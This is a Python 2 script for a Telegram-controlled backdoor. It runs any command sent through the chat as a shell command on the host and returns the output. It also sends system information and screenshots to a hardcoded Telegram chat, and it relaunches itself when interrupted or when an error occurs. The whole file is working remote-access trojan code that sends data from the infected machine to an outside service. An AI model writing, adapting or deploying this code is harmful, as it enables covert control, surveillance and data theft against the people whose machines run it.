from time import sleep as zZz
from telepot import Bot, glance
from subprocess import PIPE, Popen
from sys import argv
from bot_info import info
from bot_screenshot import screenshot


#aa=open('../11.png', 'rb')
def handle(msg):
    try:
        content_type, chat_type, chat_id = glance(msg)
        print content_type, chat_type, chat_id
        if content_type == 'text':
            if 'allinfo' in msg['text']:
                bot.sendMessage(chat_id, info())
            elif 'screenshot' in msg['text']:
                screenshot()
                bot.sendPhoto(chat_id, 'scr.png')
                
            else:
                out = Popen(msg['text'], stdout=PIPE, shell=True).stdout.read()
                bot.sendMessage(chat_id, str(out))
                #bot.sendPhoto(chat_id, aa)
    except Exception:
        pass
try:         
    bot = Bot('')
    bot.message_loop(handle)
    bot.sendMessage(181656586, info())
    print 'Listening ...'

    while 1:
        zZz(10)
except KeyboardInterrupt:
    Popen("python " + argv[0], shell=True)
except Exception as e:
    print str(e)
    Popen("python " + argv[0], shell=True)
    #pass
